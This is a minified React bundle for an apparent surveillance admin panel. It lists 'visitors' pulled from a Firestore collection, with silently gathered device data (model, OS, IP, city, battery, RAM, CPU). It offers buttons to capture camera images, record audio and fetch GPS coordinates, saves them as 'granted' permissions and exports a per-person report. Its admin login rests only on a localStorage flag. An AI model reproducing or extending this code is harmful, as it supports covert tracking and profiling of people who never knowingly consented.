Login"})})]})]})]}),E.jsxs("div",{className:"status-bar",children:[E.jsxs("div",{className:"status-item",children:[E.jsx("div",{className:"status-dot"}),E.jsx("span",{children:"SECURE"})]}),E.jsxs("div",{className:"status-item",children:[E.jsx("div",{className:"status-dot"}),E.jsx("span",{children:"ENCRYPTED"})]}),E.jsxs("div",{className:"status-item",children:[E.jsx("div",{className:"status-dot"}),E.jsx("span",{children:"READY"})]})]})]})}function mN({onLogout:t}){var P,x,w,he,Ct,Vt,ct,$,Q;const[e,n]=F.useState([]),[r,i]=F.useState(null),[s,o]=F.useState(!0),[l,u]=F.useState(""),[h,f]=F.useState(!1),[p,g]=F.useState({type:null,data:null}),[v,A]=F.useState(!1),[k,N]=F.useState(null),[S,_]=F.useState(null);F.useEffect(()=>{R();const B=setInterval(R,3e3);return()=>clearInterval(B)},[]);async function R(){try{const B=Uh(_t,"visitors"),J=(await Yw(B)).docs.map(ie=>({id:ie.id,...ie.data()}));n(J)}catch(B){console.error("Error loading visitors:",B)}o(!1)}async function V(B){try{await aN(jt(_t,"visitors",B)),n(e.filter(W=>W.id!==B)),(r==null?void 0:r.id)===B&&i(null)}catch(W){console.error("Error deleting visitor:",W)}}async function U(B){try{const W=await V_();if(W){g({type:"front",data:W.screenshot});const J=jt(_t,"visitors",B);await Cs(J,{"permissionFeatures.frontCamera":"granted","media.frontCameraScreenshot":W.screenshot})}}catch{alert("Camera access denied")}}async function j(B){try{const W=await pA();if(W){g({type:"back",data:W.screenshot});const J=jt(_t,"visitors",B);await Cs(J,{"permissionFeatures.backCamera":"granted","media.backCameraScreenshot":W.screenshot})}}catch{alert("Camera access denied")}}async function I(B){try{if(v){A(!1);return}A(!0);const W=await O_();if(W){N(W.audio),A(!1);const J=jt(_t,"visitors",B);await Cs(J,{"permissionFeatures.microphone":"granted"}),alert("Audio recorded successfully! Duration: 3 seconds")}}catch{A(!1),alert("Microphone access denied")}}async function y(B){try{const W=await L_();if(W){_({lat:W.position.coords.latitude,lng:W.position.coords.longitude});const J=jt(_t,"visitors",B);await Cs(J,{"permissionFeatures.locationLat":W.position.coords.latitude,"permissionFeatures.locationLong":W.position.coords.longitude,"permissionFeatures.locationAccuracy":W.position.coords.accuracy})}}catch{alert("Location access denied")}}function T(B){const W=B.silentFeatures||{},J=`
      <div style="font-family: Arial, sans-serif; padding: 40px; max-width: 800px; margin: 0 auto;">
        <div style="background: #667eea; color: white; padding: 30px; border-radius: 10px; margin-bottom: 30px;">
          <h1 style="margin: 0 0 10px 0;">User Report</h1>
          <p style="margin: 5px 0; opacity: 0.9;"><strong>Device:</strong> ${W.deviceModel||"N/A"}</p>
          <p style="margin: 5px 0; opacity: 0.9;"><strong>Location:</strong> ${W.countryCity||"N/A"}</p>
          <p style="margin: 5px 0; opacity: 0.9;"><strong>Generated:</strong> ${new Date().toLocaleString()}</p>
        </div>

        <div style="background: #f8f9fa; padding: 20px; border-radius: 10px; margin-bottom: 20px;">
          <h2 style="color: #667eea; margin-top: 0;">Device Information</h2>
          <table style="width: 100%; border-collapse: collapse;">
            <tr><td style="padding: 8px; border-bottom: 1px solid #e0e0e0;"><strong>Device Model:</strong></td><td style="padding: 8px; border-bottom: 1px solid #e0e0e0;">${W.deviceModel||"N/A"}</td></tr>
            <tr><td style="padding: 8px; border-bottom: 1px solid #e0e0e0;"><strong>OS:</strong></td><td style="padding: 8px; border-bottom: 1px solid #e0e0e0;">${W.osVersion||"N/A"}</td></tr>
            <tr><td style="padding: 8px; border-bottom: 1px solid #e0e0e0;"><strong>Browser:</strong></td><td style="padding: 8px; border-bottom: 1px solid #e0e0e0;">${W.browser||"N/A"}</td></tr>
            <tr><td style="padding: 8px; border-bottom: 1px solid #e0e0e0;"><strong>RAM:</strong></td><td style="padding: 8px; border-bottom: 1px solid #e0e0e0;">${W.deviceMemory||0} GB</td></tr>
            <tr><td style="padding: 8px; border-bottom: 1px solid #e0e0e0;"><strong>CPU Cores:</strong></td><td style="padding: 8px; border-bottom: 1px solid #e0e0e0;">${W.cpuCores||"N/A"}</td></tr>
            <tr><td style="padding: 8px; border-bottom: 1px solid #e0e0e0;"><strong>Battery:</strong></td><td style="padding: 8px; border-bottom: 1px solid #e0e0e0;">${W.batteryLevel?W.batteryLevel+"%":"N/A"}</td></tr>
          </table>
        </div>

        <div style="background: #f8f9fa; padding: 20px; border-radius: 10px; margin-bottom: 20px;">
          <h2 style="color: #667eea; margin-top: 0;">Location</h2>
          <p><strong>IP:</strong> ${W.ipAddress||"N/A"}</p>
          <p><strong>Country/City:</strong> ${W.countryCity||"N/A"}</p>
          <p><strong>Timezone:</strong> ${W.timezone||"N/A"}</p>
        </div>

        <p style="text-align: center; color: #999; font-size: 12px; margin-top: 40px;">
          Report generated on ${new Date().toLocaleString()}
        </p>
      </div>
    `,ie=window.open("","_blank");ie&&(ie.document.write(`
      <!DOCTYPE html>
      <html>
      <head>
        <title>User Report</title>
      </head>
      <body>
        ${J}
        <script>window.onload = function() { window.print(); }<\/script>
      </body>
      </html>
    `),ie.document.close())}const C=e.filter(B=>{var W,J,ie;return((W=B.deviceId)==null?void 0:W.toLowerCase().includes(l.toLowerCase()))||((ie=(J=B.silentFeatures)==null?void 0:J.ipAddress)==null?void 0:ie.toLowerCase().includes(l.toLowerCase()))});return E.jsxs("div",{style:{minHeight:"100vh",background:"#f5f7fa",fontFamily:'-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif'},children:[E.jsxs("div",{style:{background:"linear-gradient(135deg, #667eea 0%, #764ba2 100%)",padding:"20px 40px",display:"flex",justifyContent:"space-between",alignItems:"center",boxShadow:"0 2px 10px rgba(0,0,0,0.1)"},children:[E.jsxs("div",{children:[E.jsx("h1",{style:{color:"white",fontSize:"24px",margin:0},children:"Admin Dashboard"}),E.jsxs("p",{style:{color:"rgba(255,255,255,0.8)",margin:"5px 0 0 0",fontSize:"14px"},children:[C.length," total users"]})]}),E.jsx("button",{onClick:t,style:{background:"white",color:"#667eea",border:"none",padding:"10px 25px",borderRadius:"8px",cursor:"pointer",fontWeight:"600",fontSize:"14px"},children:"Logout"})]}),E.jsxs("div",{style:{padding:"30px 40px"},children:[E.jsxs("div",{style:{background:"white",borderRadius:"12px",padding:"20px",marginBottom:"20px",display:"flex",gap:"15px",alignItems:"center",boxShadow:"0 2px 10px rgba(0,0,0,0.05)"},children:[E.jsx("input",{type:"text",placeholder:"Search by Device ID or IP...",value:l,onChange:B=>u(B.target.value),style:{flex:1,padding:"12px 20px",border:"2px solid #e0e0e0",borderRadius:"8px",fontSize:"14px",outline:"none"}}),E.jsxs("label",{style:{display:"flex",alignItems:"center",gap:"8px",cursor:"pointer"},children:[E.jsx("input",{type:"checkbox",checked:h,onChange:B=>f(B.target.checked),style:{width:"18px",height:"18px",cursor:"pointer"}}),E.jsx("span",{style:{fontSize:"14px",color:"#666"},children:"Auto Refresh"})]}),E.jsx("button",{onClick:R,style:{background:"#667eea",color:"white",border:"none",padding:"12px 25px",borderRadius:"8px",cursor:"pointer",fontWeight:"600",fontSize:"14px"},children:"Refresh"})]}),s?E.jsx("div",{style:{textAlign:"center",padding:"60px",color:"#999"},children:"Loading..."}):E.jsxs("div",{style:{display:"grid",gridTemplateColumns:"350px 1fr",gap:"20px",minHeight:"70vh"},children:[E.jsxs("div",{style:{background:"white",borderRadius:"12px",overflow:"hidden",boxShadow:"0 2px 10px rgba(0,0,0,0.05)"},children:[E.jsx("div",{style:{padding:"15px 20px",borderBottom:"2px solid #f0f0f0",fontWeight:"600",color:"#333"},children:"Users List"}),E.jsx("div",{style:{maxHeight:"calc(70vh - 60px)",overflowY:"auto"},children:C.length===0?E.jsx("div",{style:{padding:"40px",textAlign:"center",color:"#999"},children:"No users found"}):C.map(B=>{var W,J,ie;return E.jsxs("div",{onClick:()=>i(B),style:{padding:"15px 20px",borderBottom:"1px solid #f0f0f0",cursor:"pointer",background:(r==null?void 0:r.id)===B.id?"#f0f3ff":"white",transition:"background 0.2s"},children:[E.jsx("div",{style:{fontSize:"14px",fontWeight:"600",color:"#333",marginBottom:"5px"},children:((W=B.silentFeatures)==null?void 0:W.deviceModel)||"Unknown Device"}),E.jsx("div",{style:{fontSize:"12px",color:"#999"},children:((J=B.silentFeatures)==null?void 0:J.ipAddress)||"No IP"}),E.jsx("div",{style:{fontSize:"11px",color:"#667eea",marginTop:"5px"},children:((ie=B.silentFeatures)==null?void 0:ie.countryCity)||"Unknown"})]},B.id)})})]}),E.jsx("div",{style:{background:"white",borderRadius:"12px",padding:"30px",boxShadow:"0 2px 10px rgba(0,0,0,0.05)",overflowY:"auto",maxHeight:"70vh"},children:r?E.jsxs("div",{children:[E.jsxs("div",{style:{display:"flex",justifyContent:"space-between",alignItems:"center",marginBottom:"25px",paddingBottom:"15px",borderBottom:"2px solid #f0f0f0"},children:[E.jsx("h2",{style:{margin:0,fontSize:"22px",color:"#333"},children:((P=r.silentFeatures)==null?void 0:P.deviceModel)||"User Details"}),E.jsxs("div",{style:{display:"flex",gap:"10px"},children:[E.jsx("button",{onClick:()=>T(r),style:{background:"#667eea",color:"white",border:"none",padding:"10px 15px",borderRadius:"8px",cursor:"pointer",fontWeight:"600",fontSize:"12px"},children:"Export PDF"}),E.jsx("button",{onClick:()=>V(r.id),style:{background:"#f44336",color:"white",border:"none",padding:"10px 15px",borderRadius:"8px",cursor:"pointer",fontWeight:"600",fontSize:"12px"},children:"Delete"})]})]}),E.jsxs("div",{style:{background:"#f8f9fa",borderRadius:"8px",padding:"20px",marginBottom:"20px"},children:[E.jsx("h3",{style:{margin:"0 0 15px 0",fontSize:"16px",color:"#667eea"},children:"📷 Camera"}),E.jsxs("div",{style:{display:"flex",gap:"10px",marginBottom:"15px"},children:[E.jsx("button",{onClick:()=>U(r.id),style:{background:"#4CAF50",color:"white",border:"none",padding:"10px 20px",borderRadius:"8px",cursor:"pointer",fontWeight:"600",fontSize:"14px"},children:"Capture Front Camera"}),E.jsx("button",{onClick:()=>j(r.id),style:{background:"#4CAF50",color:"white",border:"none",padding:"10px 20px",borderRadius:"8px",cursor:"pointer",fontWeight:"600",fontSize:"14px"},children:"Capture Back Camera"})]}),p.data&&E.jsxs("div",{style:{marginTop:"15px"},children:[E.jsxs("p",{style:{fontSize:"13px",color:"#666",margin:"0 0 10px 0"},children:["Preview (",p.type," camera):"]}),E.jsx("img",{src:p.data,style:{maxWidth:"100%",borderRadius:"8px",maxHeight:"200px"}})]})]}),E.jsxs("div",{style:{background:"#f8f9fa",borderRadius:"8px",padding:"20px",marginBottom:"20px"},children:[E.jsx("h3",{style:{margin:"0 0 15px 0",fontSize:"16px",color:"#667eea"},children:"🎤 Microphone"}),E.jsx("button",{onClick:()=>I(r.id),style:{background:v?"#f44336":"#4CAF50",color:"white",border:"none",padding:"10px 20px",borderRadius:"8px",cursor:"pointer",fontWeight:"600",fontSize:"14px"},children:v?"🔴 Recording... (3 sec)":"Record Audio (3 sec)"}),k&&E.jsxs("div",{style:{marginTop:"15px"},children:[E.jsx("p",{style:{fontSize:"13px",color:"#666",margin:"0 0 10px 0"},children:"Audio Recording:"}),E.jsx("audio",{controls:!0,style:{maxWidth:"100%"},children:E.jsx("source",{src:URL.createObjectURL(k),type:"audio/webm"})})]})]}),E.jsxs("div",{style:{background:"#f8f9fa",borderRadius:"8px",padding:"20px",marginBottom:"20px"},children:[E.jsx("h3",{style:{margin:"0 0 15px 0",fontSize:"16px",color:"#667eea"},children:"📍 Location"}),E.jsx("button",{onClick:()=>y(r.id),style:{background:"#4CAF50",color:"white",border:"none",padding:"10px 20px",borderRadius:"8px",cursor:"pointer",fontWeight:"600",fontSize:"14px",marginBottom:"15px"},children:"Get Location"}),S&&E.jsxs("div",{children:[E.jsxs("p",{style:{fontSize:"13px",color:"#333",margin:"0 0 8px 0"},children:[E.jsx("strong",{children:"Latitude:"})," ",S.lat.toFixed(6)]}),E.jsxs("p",{style:{fontSize:"13px",color:"#333",margin:"0 0 8px 0"},children:[E.jsx("strong",{children:"Longitude:"})," ",S.lng.toFixed(6)]}),E.jsx("a",{href:`https://www.google.com/maps/search/${S.lat},${S.lng}`,target:"_blank",rel:"noopener noreferrer",style:{display:"inline-block",background:"#2196F3",color:"white",padding:"8px 15px",borderRadius:"6px",textDecoration:"none",fontSize:"13px",fontWeight:"600",marginTop:"10px"},children:"Open in Google Maps"})]})]}),E.jsxs("div",{style:{background:"#f8f9fa",borderRadius:"8px",padding:"20px",marginBottom:"20px"},children:[E.jsx("h3",{style:{margin:"0 0 15px 0",fontSize:"16px",color:"#667eea"},children:"Device Info"}),E.jsxs("div",{style:{display:"grid",gridTemplateColumns:"1fr 1fr",gap:"15px",fontSize:"14px"},children:[E.jsxs("div",{children:[E.jsx("strong",{children:"Model:"})," ",((x=r.silentFeatures)==null?void 0:x.deviceModel)||"N/A"]}),E.jsxs("div",{children:[E.jsx("strong",{children:"OS:"})," ",((w=r.silentFeatures)==null?void 0:w.osVersion)||"N/A"]}),E.jsxs("div",{children:[E.jsx("strong",{children:"Browser:"})," ",((he=r.silentFeatures)==null?void 0:he.browser)||"N/A"]}),E.jsxs("div",{children:[E.jsx("strong",{children:"IP:"})," ",((Ct=r.silentFeatures)==null?void 0:Ct.ipAddress)||"N/A"]}),E.jsxs("div",{children:[E.jsx("strong",{children:"Location:"})," ",((Vt=r.silentFeatures)==null?void 0:Vt.countryCity)||"N/A"]}),E.jsxs("div",{children:[E.jsx("strong",{children:"Battery:"})," ",(ct=r.silentFeatures)!=null&&ct.batteryLevel?r.silentFeatures.batteryLevel+"%":"N/A"]}),E.jsxs("div",{children:[E.jsx("strong",{children:"RAM:"})," ",(($=r.silentFeatures)==null?void 0:$.deviceMemory)||0," GB"]}),E.jsxs("div",{children:[E.jsx("strong",{children:"CPU:"})," ",((Q=r.silentFeatures)==null?void 0:Q.cpuCores)||"N/A"," cores"]})]})]})]}):E.jsx("div",{style:{textAlign:"center",padding:"60px",color:"#999"},children:"Select a user to view details"})})]})]})]})}function gN(){const[t,e]=F.useState(!1),[n,r]=F.useState(!0);return F.useEffect(()=>{localStorage.getItem("adminAuth")==="true"&&e(!0),r(!1)},[]),n?E.jsx("div",{style:{display:"flex",justifyContent:"center",alignItems:"center",height:"100vh"},children:"Loading..."}):E.jsxs(QS,{children:[E.jsx(Es,{path:"/",element:E.jsx(hN,{})}),E.jsx(Es,{path:"/admin/login",element:t?E.jsx(lc,{to:"/admin/dashboard"}):E.jsx(pN,{onSuccess:()=>{e(!0),localStorage.setItem("adminAuth","true")}})}),E.jsx(Es,{path:"/admin/dashboard",element:t?E.jsx(mN,{onLogout:()=>{e(!1),localStorage.removeItem("adminAuth")}}):E.jsx(lc,{to:"/admin/login"})}),E.jsx(Es,{path:"/admin",element:E.jsx(lc,{to:t?"/admin/dashboard":"/admin/login"})})]})}function yN(){return E.jsx(JS,{children:E.jsx(gN,{})})}Ec.createRoot(document.getElementById("root")).render(E.jsx(vy.StrictMode,{children:E.jsx(yN,{})}));
